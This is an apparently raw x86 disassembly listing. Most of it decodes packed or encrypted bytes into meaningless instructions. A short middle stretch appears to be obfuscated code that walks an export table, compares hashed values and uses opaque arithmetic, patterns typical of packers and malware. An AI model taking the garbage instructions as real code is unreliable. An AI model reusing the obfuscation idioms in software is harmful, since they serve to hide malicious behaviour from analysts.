  40f301:	std    
  40f302:	adc    BYTE PTR [edi],dl
  40f304:	loope  0x40f317
  40f306:	leave  
  40f307:	xor    DWORD PTR [edi+0x42],esp
  40f30a:	scas   eax,DWORD PTR es:[edi]
  40f30b:	mov    ah,0x83
  40f30d:	push   si
  40f30f:	sub    eax,0xddbde18d
  40f314:	mov    al,0xf0
  40f316:	(bad)  
  40f317:	outs   dx,BYTE PTR ds:[esi]
  40f319:	daa    
  40f31a:	push   ecx
  40f31b:	xor    al,0xf5
  40f31d:	out    dx,al
  40f31e:	and    DWORD PTR [edi],eax
  40f320:	test   DWORD PTR [edx],eax
  40f322:	int    0x3
  40f324:	outs   dx,DWORD PTR ds:[esi]
  40f325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f326:	aaa    
  40f327:	fwait
  40f328:	jg     0x40f373
  40f32a:	(bad)
  40f32e:	out    dx,al
  40f32f:	in     eax,dx
  40f330:	aad    0x98
  40f332:	add    bh,BYTE PTR [eax+ecx*4]
  40f335:	in     eax,dx
  40f336:	sbb    edx,DWORD PTR [esp+ecx*2+0x5c091a61]
  40f33d:	add    cl,bl
  40f33f:	xchg   DWORD PTR [ebx],edi
  40f341:	sbb    eax,0x4cb014c1
  40f346:	sub    al,0x51
  40f348:	jo     0x40f346
  40f34a:	adc    edi,ebp
  40f34c:	pop    eax
  40f34d:	push   edx
  40f34e:	mov    dl,0x23
  40f350:	adc    eax,0xa514d531
  40f355:	ficomp WORD PTR [ebx+0x2a8665e7]
  40f35b:	xor    DWORD PTR es:0x77e7ac53,edi
  40f362:	outs   dx,DWORD PTR ds:[esi]
  40f363:	or     dl,BYTE PTR [edi+0x4e]
  40f366:	push   es
  40f367:	pop    ecx
  40f368:	out    0x8d,eax
  40f36a:	sub    BYTE PTR [ebp-0x19],dl
  40f36d:	sbb    BYTE PTR [ecx],dl
  40f36f:	jo     0x40f343
  40f371:	sbb    al,0xf
  40f373:	aad    0xe7
  40f375:	dec    esi
  40f376:	pop    eax
  40f377:	mov    ecx,0xcbc1568d
  40f37c:	or     DWORD PTR [edi-0x4b],esp
  40f37f:	out    dx,eax
  40f380:	test   DWORD PTR [ebp-0x12],edx
  40f383:	add    BYTE PTR [bx+di-0x3c],dl
  40f387:	sbb    esi,DWORD PTR [eax+ebx*2]
  40f38a:	stos   BYTE PTR es:[edi],al
  40f38b:	fnstsw WORD PTR [edx+0x0]
  40f38e:	or     eax,0x18f7d745
  40f393:	pushf  
  40f394:	mov    dh,0xc2
  40f396:	cli    
  40f397:	call   0x58a08c29
  40f39c:	rcr    ecx,cl
  40f39e:	pop    ss
  40f39f:	or     DWORD PTR [ecx+ebx*4+0x524e03dd],0x1d
  40f3a7:	xor    al,BYTE PTR [edi]
  40f3a9:	and    al,0x78
  40f3ab:	call   0x45dd:0xbe48b3f3
  40f3b2:	sahf   
  40f3b3:	out    dx,eax
  40f3b4:	test   eax,0x7957e1bd
  40f3b9:	cld    
  40f3ba:	and    BYTE PTR [esi+0x2e4d9cd5],ch
  40f3c0:	imul   eax,edi,0x360a963f
  40f3c6:	xchg   DWORD PTR [edx],ecx
  40f3c8:	dec    ebx
  40f3c9:	push   ds
  40f3ca:	push   0xfd476bc4
  40f3cf:	test   al,0x37
  40f3d1:	ffreep st(5)
  40f3d3:	pop    ebp
  40f3d4:	fsubrp st(7),st
  40f3d6:	fwait
  40f3d7:	mov    ecx,0x538298d7
  40f3dc:	or     BYTE PTR [edi],ah
  40f3de:	push   edx
  40f3df:	or     eax,0xf892fbae
  40f3e5:	aam    0x44
  40f3e7:	push   edx
  40f3e8:	ja     0x40f423
  40f3ea:	rol    BYTE PTR [esi+0x13692ba8],0xef
  40f3f1:	sub    dl,0xaf
  40f3f4:	jecxz  0x40f409
  40f3f6:	cwde   
  40f3f7:	(bad)  
  40f3f8:	fistp  DWORD PTR [esi+0x7d]
  40f3fb:	add    eax,0xec275c6e
  40f400:	stc    
  40f401:	icebp  
  40f402:	cmp    esp,ebx
  40f404:	pop    ecx
  40f405:	cmp    DWORD PTR [eax-0x21],0xa3793127
  40f40c:	loopne 0x40f455
  40f40e:	inc    edi
  40f40f:	enter  0xe866,0x5c
  40f413:	fldcw  WORD PTR [eax]
  40f415:	out    dx,eax
  40f416:	dec    ebx
  40f417:	cld    
  40f418:	dec    ebx
  40f419:	jmp    0xcfd27a2e
  40f41e:	sar    DWORD PTR [edi],cl
  40f420:	js     0x40f497
  40f422:	push   edx
  40f423:	mov    esp,0xe7636b7d
  40f428:	not    DWORD PTR [eax]
  40f42a:	dec    ecx
  40f42b:	adc    DWORD PTR [esp+ecx*2],ebp
  40f42e:	repnz inc edi
  40f430:	jle    0x40f4a4
  40f432:	and    dh,BYTE PTR [edi]
  40f434:	nop
  40f435:	js     0x40f45d
  40f437:	jb     0x40f4a0
  40f439:	into   
  40f43a:	retf   
  40f43b:	xchg   DWORD PTR [edi+0xa],esp
  40f43e:	adc    DWORD PTR [ebx],edx
  40f440:	jae    0x40f4a8
  40f442:	sbb    dh,BYTE PTR [esi-0x25]
  40f445:	inc    edi
  40f446:	out    0x85,al
  40f448:	push   ebp
  40f449:	frstor [ebp-0x614f0866]
  40f44f:	mov    ecx,0x5f22fa54
  40f454:	fsubr  DWORD PTR [ebx]
  40f456:	pop    edx
  40f457:	or     eax,0x244665c1
  40f45c:	call   DWORD PTR [ebx-0x35]
  40f45f:	shr    DWORD PTR [ecx+0x198953c6],cl
  40f465:	dec    esi
  40f466:	pop    es
  40f467:	(bad)  
  40f468:	stos   DWORD PTR es:[edi],eax
  40f469:	ror    BYTE PTR [edx+0xb3928a4],1
  40f46f:	pop    es
  40f470:	push   esp
  40f471:	pop    edx
  40f472:	dec    eax
  40f473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f474:	jmp    0x9c1e:0xc487f5c5
  40f47b:	fsub   QWORD PTR [edx-0x6bbc96cb]
  40f481:	out    0x42,al
  40f483:	out    dx,eax
  40f484:	dec    eax
  40f485:	sub    eax,0x76678cf0
  40f48a:	icebp  
  40f48b:	mov    esi,0x38c57631
  40f490:	xor    bh,bh
  40f492:	int3   
  40f493:	cwde   
  40f494:	mov    gs,WORD PTR ds:0x167c6e47
  40f49a:	repnz xchg esi,eax
  40f49c:	pop    esp
  40f49d:	mov    edx,0xd0bbd8a9
  40f4a2:	sub    BYTE PTR [ebx+0x2c743eba],bl
  40f4a8:	or     eax,0x8263470a
  40f4ad:	out    0x53,al
  40f4af:	adc    al,0xc
  40f4b1:	cli    
  40f4b2:	shr    DWORD PTR [eax-0xc],1
  40f4b5:	imul   edi,ebp,0xbff6a922
  40f4bb:	popf   
  40f4bc:	int    0xe6
  40f4be:	dec    eax
  40f4bf:	sub    al,0x1c
  40f4c1:	in     eax,0xa1
  40f4c3:	inc    ecx
  40f4c4:	cli    
  40f4c5:	or     ebx,DWORD PTR ds:0x7ab4e1ab
  40f4cb:	push   esi
  40f4cc:	xor    BYTE PTR ds:0xb78c7c49,bh
  40f4d2:	cdq    
  40f4d3:	mov    ebx,0xaaf2a29c
  40f4d8:	cmp    dl,BYTE PTR [ecx+edi*4+0x66ba8de2]
  40f4df:	jmp    0x40f506
  40f4e1:	xchg   esp,eax
  40f4e2:	fs pop edi
  40f4e4:	pop    ds
  40f4e5:	sub    DWORD PTR [ebp+0x18],ecx
  40f4e8:	jnp    0x40f4af
  40f4ea:	inc    esp
  40f4eb:	js     0x40f4ce
  40f4ed:	and    al,0x13
  40f4ef:	push   ebx
  40f4f0:	fcom   DWORD PTR ds:0xac5f7087
  40f4f6:	jmp    0x799:0xed395a25
  40f4fd:	aam    0xf5
  40f4ff:	ds push es
  40f501:	jmp    DWORD PTR [eax-0x1d90de34]
  40f507:	cmp    ebp,DWORD PTR [edi+eiz*1]
  40f50a:	fsubr  QWORD PTR [edx]
  40f50c:	inc    esi
  40f50d:	xchg   ecx,eax
  40f50e:	push   0xc50aca2e
  40f513:	pop    ds
  40f514:	jp     0x40f548
  40f516:	inc    edx
  40f517:	mov    dh,dh
  40f519:	dec    eax
  40f51a:	aas    
  40f51b:	lods   eax,DWORD PTR ds:[esi]
  40f51c:	lock ror DWORD PTR [ecx-0x56d933b7],1
  40f523:	stos   BYTE PTR es:[edi],al
  40f524:	ins    DWORD PTR es:[edi],dx
  40f525:	push   ebx
  40f526:	push   ds
  40f527:	jno    0x40f51d
  40f529:	jg     0x40f589
  40f52b:	mov    ds:0x9abde432,eax
  40f530:	sub    ch,cl
  40f532:	(bad)  
  40f533:	(bad)  
  40f534:	shl    BYTE PTR cs:[esi],cl
  40f537:	cli    
  40f538:	pushf  
  40f539:	dec    ebx
  40f53a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f53b:	cdq    
  40f53c:	adc    cl,0x5a
  40f53f:	xor    edx,0x25
  40f542:	sub    DWORD PTR gs:[ebp+0x50e12c8d],eax
  40f549:	jno    0x40f593
  40f54b:	fsubrp st(4),st
  40f54d:	shl    DWORD PTR ds:0x825bf08e,1
  40f553:	mov    esi,0x3d3d91df
  40f558:	ds inc eax
  40f55a:	rcr    DWORD PTR [edx],cl
  40f55c:	aam    0xe9
  40f55e:	sub    eax,0xf1685e4
  40f563:	xor    ch,dh
  40f565:	cmp    eax,0xe7f021d3
  40f56a:	scas   eax,DWORD PTR es:[edi]
  40f56b:	inc    edx
  40f56c:	stos   BYTE PTR es:[edi],al
  40f56d:	mov    bh,0x73
  40f56f:	cld    
  40f570:	mov    dl,0xbe
  40f572:	pushf  
  40f573:	pop    ss
  40f574:	or     al,0x35
  40f576:	ins    BYTE PTR es:[edi],dx
  40f577:	ja     0x40f544
  40f579:	mov    bl,0x33
  40f57b:	add    BYTE PTR [ecx+ebp*4+0x283e5d09],cl
  40f582:	push   eax
  40f583:	add    DWORD PTR [edx+0x3c8011af],esp
  40f589:	pop    esi
  40f58a:	xor    dh,BYTE PTR [ecx+0x1b]
  40f58d:	in     al,0xa3
  40f58f:	add    BYTE PTR [edx-0x40],dh
  40f592:	scas   al,BYTE PTR es:[edi]
  40f593:	into   
  40f594:	jmp    0x40f58a
  40f596:	test   al,0x9b
  40f598:	cmp    edi,DWORD PTR [eax+0x57]
  40f59b:	jo     0x40f539
  40f59d:	stc    
  40f59e:	lods   eax,DWORD PTR ds:[esi]
  40f59f:	cli    
  40f5a0:	pop    ebp
  40f5a1:	(bad)  
  40f5a2:	das    
  40f5a3:	shl    BYTE PTR [ebx-0x6fbd5d2d],1
  40f5a9:	sub    DWORD PTR [esi+0x1aeb3942],eax
  40f5af:	fmul   QWORD PTR [edi]
  40f5b1:	xor    BYTE PTR [edx+0x3b],0xc8
  40f5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40f5b8:	je     0x40f617
  40f5be:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5c1:	xor    eax,esi
  40f5c3:	add    eax,edi
  40f5c5:	cmp    ecx,eax
  40f5c7:	je     0x40f620
  40f5cd:	lea    eax,[ebp-0x8]
  40f5d0:	push   eax
  40f5d1:	push   DWORD PTR [ebp-0x28]
  40f5d4:	push   DWORD PTR [ebp+0xc]
  40f5d7:	call   0x411bb3
  40f5dc:	mov    eax,DWORD PTR [ebp-0x4]
  40f5df:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5e2:	xor    eax,esi
  40f5e4:	add    eax,edi
  40f5e6:	cmp    ecx,eax
  40f5e8:	je     0x40f603
  40f5ee:	mov    eax,DWORD PTR [ebp-0x34]
  40f5f1:	movzx  eax,WORD PTR [eax+ebx*2]
  40f5f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5f8:	mov    eax,DWORD PTR [ecx+eax*4]
  40f5fb:	mov    DWORD PTR [ebp-0x38],eax
  40f5fe:	jmp    0x40d1fa
  40f603:	mov    eax,DWORD PTR [ebp-0xc]
  40f606:	xor    eax,esi
  40f608:	lea    ebx,[ebx+eax*1+0x3272f6]
  40f60f:	jmp    0x40cf5b
  40f614:	mov    eax,DWORD PTR [ebp-0x4]
  40f617:	xor    eax,esi
  40f619:	add    eax,edi
  40f61b:	jmp    0x411aee
  40f620:	mov    eax,DWORD PTR [ebp-0x38]
  40f623:	add    eax,DWORD PTR [ebp+0x8]
  40f626:	mov    DWORD PTR [ebp-0x18],eax
  40f629:	mov    eax,DWORD PTR [ebp-0x1c]
  40f62c:	test   eax,eax
  40f62e:	je     0x411a77
  40f634:	mov    DWORD PTR [ebp-0x20],0x0
  40f63b:	push   0x3
  40f63d:	xor    edx,edx
  40f63f:	pop    edx
  40f640:	add    edx,0x8
  40f643:	push   edx
  40f644:	pop    ecx
  40f645:	push   0x6
  40f647:	dec    ecx
  40f648:	pop    ebx
  40f649:	dec    ebx
  40f64a:	xchg   ebx,ecx
  40f64c:	sub    ebx,ecx
  40f64e:	xchg   ebx,ecx
  40f650:	dec    ecx
  40f651:	mov    eax,DWORD PTR [ebp-0x1c]
  40f654:	imul   eax,ecx
  40f657:	sub    esp,eax
  40f659:	mov    DWORD PTR [ebp-0x20],esp
  40f65c:	mov    eax,DWORD PTR [ebp-0x4]
  40f65f:	xor    eax,esi
  40f661:	add    eax,edi
  40f663:	jmp    0x411a50
  40f668:	mov    ecx,DWORD PTR [ebp-0xc]
  40f66b:	mov    eax,DWORD PTR [ebp+0x8]
  40f66e:	mov    edx,DWORD PTR [ebp+0x14]
  40f671:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40f675:	jmp    0x411a24
  40f67a:	push   edi
  40f67b:	into   
  40f67c:	cmc    
  40f67d:	pop    ss
  40f67e:	in     al,0x4
  40f680:	xchg   ebp,eax
  40f681:	mov    ?,WORD PTR [edi-0x4a3da05]
  40f687:	mov    al,0xd8
  40f689:	push   0xffffffc3
  40f68b:	scas   eax,DWORD PTR es:[edi]
  40f68c:	add    DWORD PTR [ebx-0x7c7c9f0f],0x74
  40f693:	mov    DWORD PTR [ebx+eiz*8-0x3e],0x61613e96
  40f69b:	and    DWORD PTR [esi-0x7e911d8c],0xffffff93
  40f6a2:	jmp    0x1744:0x9ca5a8f4
  40f6a9:	(bad)  
  40f6aa:	std    
  40f6ab:	test   DWORD PTR [ebx+0x18],edi
  40f6ae:	mov    ecx,0x950e26d0
  40f6b3:	pop    esi
  40f6b4:	xor    BYTE PTR [ecx],bh
  40f6b6:	push   cs
  40f6b7:	stos   BYTE PTR es:[edi],al
  40f6b8:	adc    dh,BYTE PTR [ebp+ebx*8+0x23589f23]
  40f6bf:	mov    bl,0xf7
  40f6c1:	push   esi
  40f6c2:	js     0x40f6c6
  40f6c4:	xor    BYTE PTR [esi],bh
  40f6c6:	mov    dh,0x8
  40f6c8:	scas   eax,DWORD PTR es:[edi]
  40f6c9:	sti    
  40f6ca:	dec    eax
  40f6cb:	and    eax,0x2e30a994
  40f6d0:	push   eax
  40f6d1:	adc    dl,BYTE PTR [ebp+0x39f69e6]
  40f6d7:	aad    0x6b
  40f6d9:	jmp    0xbcd4:0x3d0bd01b
  40f6e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6e1:	push   cs
  40f6e2:	push   eax
  40f6e3:	call   0x7ec5:0xdbbabe35
  40f6ea:	into   
  40f6eb:	hlt    
  40f6ec:	mov    al,0xd4
  40f6ee:	jbe    0x40f750
  40f6f0:	xchg   BYTE PTR [edx+0x66c6464c],bh
  40f6f6:	popf   
  40f6f7:	call   0x1087:0xa35042ce
  40f6fe:	retf   0x3b5a
  40f701:	out    dx,al
  40f702:	shl    DWORD PTR [edx+0x2],1
  40f705:	mov    BYTE PTR [edx+ebx*2],ch
  40f708:	and    DWORD PTR [edi+ebx*1],esp
  40f70b:	scas   al,BYTE PTR es:[edi]
  40f70c:	xchg   esi,eax
  40f70d:	push   esi
  40f70e:	loope  0x40f71e
  40f710:	test   eax,0x83ed96d6
  40f715:	data16 repnz cmc 
  40f718:	xchg   esp,eax
  40f719:	pop    edi
  40f71a:	cmc    
  40f71b:	mov    dl,0x6b
  40f71d:	mov    al,0x9
  40f71f:	push   ecx
  40f720:	pop    eax
  40f721:	outs   dx,DWORD PTR ds:[esi]
  40f722:	mov    dh,0x98
  40f724:	sub    BYTE PTR cs:[ebx],cl
  40f727:	out    0x53,al
  40f729:	ss loop 0x40f767
  40f72c:	jmp    0x3dd5bcc3
  40f731:	fidiv  DWORD PTR [eax-0x7]
  40f734:	push   ss
  40f735:	retf   0x2f42
  40f738:	xchg   dl,dl
  40f73a:	ds (bad) 
  40f73c:	icebp  
  40f73d:	loop   0x40f713
  40f73f:	fisttp WORD PTR [edx-0x7c57e3af]
  40f745:	xchg   edx,eax
  40f746:	jns    0x40f78c
  40f748:	mov    bl,0x2a
  40f74a:	lods   eax,DWORD PTR ds:[esi]
  40f74b:	dec    edi
  40f74c:	pop    ss
  40f74d:	aad    0xaf
  40f74f:	mov    gs,WORD PTR [ebx-0x56]
  40f752:	sbb    bh,al
  40f754:	leave  
  40f755:	popa   
  40f756:	fidiv  WORD PTR [eax+ebx*8]
  40f759:	inc    eax
  40f75a:	sub    eax,0x5c174df9
  40f75f:	mov    dl,0x14
  40f761:	enter  0x605c,0x1d
  40f765:	(bad)  
  40f766:	ret    0x7511
  40f769:	xor    edx,ecx
  40f76b:	hlt    
  40f76c:	jnp    0x40f6fb
  40f76e:	sbb    esi,esp
  40f770:	cwde   
  40f771:	add    edi,DWORD PTR [edx]
  40f773:	lock mov bl,0x1
  40f776:	mov    cs,ecx
  40f778:	sub    dh,BYTE PTR [ebx-0x340ae3f]
  40f77e:	std    
  40f77f:	imul   edi,DWORD PTR [edi-0x44073944],0x4580e3c3
  40f789:	sub    BYTE PTR [edi],ah
  40f78b:	push   ebp
  40f78c:	out    dx,al
  40f78d:	pop    ecx
  40f78e:	hlt    
  40f78f:	mov    ch,0x31
  40f791:	(bad)  
  40f792:	daa    
  40f793:	ins    DWORD PTR es:[edi],dx
  40f794:	lahf   
  40f795:	sub    al,0x66
  40f797:	push   cs
  40f798:	mov    al,BYTE PTR [esi+0x2fb54e90]
  40f79e:	sub    dl,0xc7
  40f7a1:	nop
  40f7a2:	shl    DWORD PTR [esi+0x3a],cl
  40f7a5:	rcr    BYTE PTR [edi-0x73058463],0xe0
  40f7ac:	idiv   bh
  40f7ae:	sbb    eax,0x17facc56
  40f7b3:	mov    ecx,edx
  40f7b5:	push   esp
  40f7b6:	xlat   BYTE PTR ds:[ebx]
  40f7b7:	xchg   ecx,eax
  40f7b8:	sar    DWORD PTR [edi-0x3e],cl
  40f7bb:	mov    edx,0xa70b138a
  40f7c0:	loope  0x40f839
  40f7c2:	lahf   
  40f7c3:	push   es
  40f7c4:	stos   DWORD PTR es:[edi],eax
  40f7c5:	pop    eax
  40f7c6:	or     al,0x2d
  40f7c8:	test   al,0x97
  40f7ca:	add    BYTE PTR [esi-0x6a],cl
  40f7cd:	jmp    0x571f4d5d
  40f7d2:	mov    bh,0xfd
  40f7d4:	sub    ah,BYTE PTR [ebx]
  40f7d6:	lods   eax,DWORD PTR ds:[esi]
  40f7d7:	fcom   DWORD PTR [ecx]
  40f7d9:	icebp  
  40f7da:	scas   al,BYTE PTR es:[edi]
  40f7db:	mov    WORD PTR [ebp+0x18351d21],es
  40f7e1:	mov    bh,0xc2
  40f7e3:	jge    0x40f83a
  40f7e5:	mov    eax,0xa28835b
  40f7ea:	inc    eax
  40f7eb:	pop    eax
  40f7ec:	stc    
  40f7ed:	jo     0x40f85e
  40f7ef:	fs pushf 
  40f7f1:	rcr    BYTE PTR [edi-0x50153e30],1
  40f7f7:	sahf   
  40f7f8:	dec    edi
  40f7f9:	icebp  
  40f7fa:	cwde   
  40f7fb:	xor    BYTE PTR [edi],0xcf
  40f7fe:	fsub   st(5),st
  40f800:	ret    
  40f801:	mov    cl,0x1d
  40f803:	add    eax,0xdf2d41f5
  40f808:	in     eax,0x3a
  40f80a:	xor    al,dl
  40f80c:	into   
  40f80d:	ret    0xeac2
  40f810:	(bad)  
  40f812:	dec    eax
  40f813:	pop    es
  40f814:	xor    BYTE PTR [ebx-0x4f],bl
  40f817:	mov    cl,0xfe
  40f819:	sbb    ecx,ebx
  40f81b:	and    DWORD PTR [eax],esp
  40f81d:	sub    al,0x6d
  40f81f:	mov    ebx,0xa229f561
  40f824:	add    al,0x58
  40f826:	call   0x10f7:0x8bd81967
  40f82d:	clc    
  40f82e:	jno    0x40f89d
  40f830:	dec    ebp
  40f831:	nop
  40f832:	nop
  40f833:	add    esp,edi
  40f835:	test   ch,bh
  40f837:	xchg   edi,eax
  40f838:	stos   DWORD PTR es:[edi],eax
  40f839:	pop    ds
  40f83a:	(bad)  
  40f83b:	jl     0x40f7db
  40f83d:	add    eax,DWORD PTR [ecx-0x39]
  40f840:	mov    ah,0xeb
  40f842:	mov    ch,0xf9
  40f844:	sbb    DWORD PTR [eax+0x6f],0x7a
  40f848:	mov    ecx,0x4f7d7007
  40f84d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f84e:	inc    esi
  40f84f:	xchg   esi,eax
  40f850:	jbe    0x40f805
  40f852:	not    BYTE PTR [ecx-0x6463ee18]
  40f858:	aam    0xd8
  40f85a:	test   bh,0xa6
  40f85d:	scas   al,BYTE PTR es:[edi]
  40f85e:	push   eax
  40f85f:	sbb    DWORD PTR [ecx-0x34],ecx
  40f862:	pop    edi
  40f863:	xchg   ebx,eax
  40f864:	out    0xdf,eax
  40f866:	push   ds
  40f867:	scas   al,BYTE PTR es:[edi]
  40f868:	cmp    esp,0xfffffff3
  40f86b:	es es push 0xffffff8d
  40f86f:	dec    ebx
  40f870:	or     al,0x5
  40f872:	or     esi,DWORD PTR [edi-0x4e097924]
  40f878:	jmp    0x9475c1fa
  40f87d:	in     al,dx
  40f87e:	pop    esi
  40f87f:	cli    
  40f880:	pushf  
  40f881:	(bad)  
  40f882:	adc    ah,dl
  40f884:	iret   
  40f885:	sub    ecx,DWORD PTR [eax-0x608a8fc1]
  40f88b:	and    al,0xe7
  40f88d:	xor    eax,esi
  40f88f:	adc    DWORD PTR [esp+ebx*1],ebx
  40f892:	out    0x31,eax
  40f894:	mov    ebx,0xf0f6b6f7
  40f899:	cmp    dh,dl
  40f89b:	add    cl,0x39
  40f89e:	and    ah,bl
  40f8a0:	jb     0x40f8f4
  40f8a2:	cmp    DWORD PTR [esi],esp
  40f8a4:	lahf   
  40f8a5:	dec    edx
  40f8a6:	jmp    0x40f8b3
  40f8a8:	retf   
  40f8a9:	mov    bh,ah
  40f8ab:	dec    eax
  40f8ac:	push   edx
  40f8ad:	lea    ebp,[eax+0x39]
  40f8b0:	lods   eax,DWORD PTR ds:[esi]
  40f8b1:	aam    0x85
  40f8b3:	out    dx,al
  40f8b4:	push   ebx
  40f8b5:	test   eax,0xbf3ab89d
  40f8ba:	into   
  40f8bb:	pop    ds
  40f8bc:	fld    DWORD PTR [ebx]
  40f8be:	scas   eax,DWORD PTR es:[edi]
  40f8bf:	in     al,0x99
  40f8c1:	push   es
  40f8c2:	rcl    DWORD PTR [edx-0x1a],cl
  40f8c5:	jae    0x40f878
  40f8c7:	retf   
  40f8c8:	sub    al,0x1f
  40f8ca:	mov    ebp,0x72c782c0
  40f8cf:	mov    fs,esi
  40f8d1:	sbb    al,0xff
  40f8d3:	sub    DWORD PTR [ebx],ebx
  40f8d5:	dec    ebp
  40f8d6:	leave  
  40f8d7:	ins    BYTE PTR es:[edi],dx
  40f8d8:	sbb    BYTE PTR [edi+0x5913d9f2],bl
  40f8de:	ins    BYTE PTR es:[edi],dx
  40f8df:	jne    0x40f90c
  40f8e1:	aaa    
  40f8e2:	xbegin 0x54d80425
  40f8e8:	aam    0x43
  40f8ea:	lea    ebx,[edi-0x1c]
  40f8ed:	cmp    al,0xe4
  40f8ef:	stos   BYTE PTR es:[edi],al
  40f8f0:	repz test al,0x3
  40f8f3:	xor    BYTE PTR [edi+0x9f45bfa],ch
  40f8f9:	and    dh,cl
  40f8fb:	jne    0x40f8d4
  40f8fd:	push   ss
  40f8fe:	inc    ebx
  40f8ff:	add    DWORD PTR [esi-0x13],edx
  40f902:	mov    BYTE PTR [ecx-0x77e2c0a8],bl
  40f908:	lock sbb al,0x99
  40f90b:	inc    ebx
  40f90c:	gs icebp 
  40f90e:	add    eax,0xdbde634e
  40f913:	arpl   WORD PTR [ebx+0x3d],bp
  40f916:	cwde   
  40f917:	jecxz  0x40f939
  40f919:	ret    
  40f91a:	mov    ebx,0xb41d346
  40f91f:	push   ebx
  40f920:	push   ds
  40f921:	pop    edi
  40f922:	in     eax,dx
  40f923:	mov    bl,0x6
  40f925:	nop
  40f926:	rcl    edx,cl
  40f928:	dec    ebp
  40f929:	add    BYTE PTR [eax],0x9b
  40f92c:	dec    ecx
  40f92d:	jmp    0xdb7a:0xe20542f
  40f934:	mov    ah,0x1e
  40f936:	fnsetpm(287 only) 
  40f938:	push   esi
  40f939:	xor    dh,BYTE PTR [ecx]
  40f93b:	mov    esp,0xa2a774a1
  40f940:	mov    ebp,0xd0d8bd83
  40f945:	mov    ebx,0xe5669feb
  40f94a:	std    
  40f94b:	rcl    BYTE PTR [edi+eiz*1-0x751b3f19],1
  40f952:	and    BYTE PTR [edx],ch
  40f954:	in     eax,dx
  40f955:	xor    eax,0xa2d8c809
  40f95a:	or     cl,BYTE PTR [eax+0x41]
  40f95d:	pop    ds
  40f95e:	dec    ebp
  40f95f:	pop    es
  40f960:	adc    al,0x76
  40f962:	popf   
  40f963:	sub    ch,0x16
  40f966:	inc    dl
  40f968:	inc    ecx
  40f969:	lock out dx,eax
  40f96b:	hlt    
  40f96c:	test   bl,dh
  40f96e:	add    DWORD PTR ds:0xa7bf3b70,eax
  40f974:	mov    al,0xb
  40f976:	mov    cl,0x88
  40f978:	push   ecx
  40f979:	inc    bx
  40f97b:	fstp   TBYTE PTR [ebp+0x13]
  40f97e:	daa    
  40f97f:	xor    cl,BYTE PTR [ebp+0x4b1c377e]
  40f985:	outs   dx,BYTE PTR ds:[esi]
  40f986:	jb     0x40f912
  40f988:	xor    al,0x56
  40f98a:	push   esp
  40f98b:	cmp    dl,BYTE PTR [edi-0x4a]
  40f98e:	and    edx,DWORD PTR [edi-0x59]
  40f991:	mov    ah,BYTE PTR [eax]
  40f993:	sahf   
  40f994:	inc    ecx
  40f995:	mov    ch,0xc6
  40f997:	(bad)  
  40f998:	(bad)  
  40f999:	outs   dx,DWORD PTR ds:[esi]
  40f99a:	and    edi,eax
  40f99c:	xchg   ebp,eax
  40f99d:	push   0x55
  40f99f:	dec    ebx
  40f9a0:	dec    esi
  40f9a1:	cmp    eax,0xfc6d6899
  40f9a6:	push   esp
  40f9a7:	jecxz  0x40fa17
  40f9a9:	jecxz  0x40f987
  40f9ab:	(bad)  
  40f9ac:	cdq    
  40f9ad:	sub    eax,0x96808ce7
  40f9b2:	popf   
  40f9b3:	mov    ecx,0xab60dfe4
  40f9b8:	ins    DWORD PTR es:[edi],dx
  40f9b9:	sbb    DWORD PTR [edi-0x58f53084],ebx
  40f9bf:	jge    0x40f9a4
  40f9c1:	out    dx,al
  40f9c2:	xchg   ebx,eax
  40f9c3:	addr16 adc al,0xa9
  40f9c6:	ficomp WORD PTR [eax-0x47]
  40f9c9:	mov    BYTE PTR ds:0x898eeb95,ah
  40f9cf:	push   0x38d400f5
  40f9d4:	out    dx,al
  40f9d5:	js     0x40f97c
  40f9d7:	jmp    0x37a48e5
  40f9dc:	dec    esi
  40f9dd:	add    al,0x4e
  40f9df:	test   al,0x2e
  40f9e1:	mov    fs,WORD PTR [ebx]
  40f9e3:	in     eax,dx
  40f9e4:	test   BYTE PTR [edi+0x400b325b],dh
  40f9ea:	mov    WORD PTR [eax+0x4daa7d77],cs
  40f9f0:	pop    es
  40f9f1:	stos   BYTE PTR es:[edi],al
  40f9f2:	or     BYTE PTR [ebx+0x71],cl
  40f9f5:	lock stc 
  40f9f7:	sbb    al,0x6d
  40f9f9:	in     al,0x1
  40f9fb:	adc    ebp,DWORD PTR [ebp+0x40]
  40f9fe:	inc    ecx
  40f9ff:	lods   eax,DWORD PTR ds:[esi]
  40fa00:	test   al,0xcc
  40fa02:	out    dx,al
  40fa03:	mov    ds:0x1796308b,eax
  40fa08:	sets   BYTE PTR [edi-0x640ea208]
  40fa0f:	jl     0x40f9c9
  40fa11:	fadd   st(7),st
  40fa13:	scas   eax,DWORD PTR es:[edi]
  40fa14:	cmc    
  40fa15:	push   ss
  40fa16:	in     eax,dx
  40fa17:	shr    esp,1
  40fa19:	mov    bl,0x37
  40fa1b:	(bad)  
  40fa1d:	cmp    edx,ecx
  40fa1f:	adc    esi,DWORD PTR [edx]
  40fa21:	pop    ds
  40fa22:	mov    bl,BYTE PTR [esp-0x2e6d8403]
  40fa29:	fcmovne st,st(5)
  40fa2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa2c:	inc    edi
  40fa2d:	cli    
  40fa2e:	in     al,0x12
  40fa30:	cld    
  40fa31:	ret    
  40fa32:	je     0x40fa8f
  40fa34:	aaa    
  40fa35:	adc    BYTE PTR [ebx+0x40],0x89
  40fa39:	in     al,0x6
  40fa3b:	push   cs
  40fa3c:	(bad)  [ecx+0x6be489bd]
  40fa42:	sti    
  40fa43:	test   DWORD PTR [edx+edi*4-0x48],esi
  40fa47:	test   al,0x3e
  40fa49:	push   0xfe137435
  40fa4e:	pop    ebx
  40fa4f:	sbb    bh,BYTE PTR [ebx-0x5625b0d8]
  40fa55:	fsincos 
  40fa57:	add    BYTE PTR [edx],cl
  40fa59:	mov    ch,0xbd
  40fa5b:	imul   ebx,DWORD PTR [edi-0x85a15e2],0x6318153c
  40fa65:	(bad)  
  40fa66:	xchg   esi,eax
  40fa67:	mov    ds:0xe6658728,al
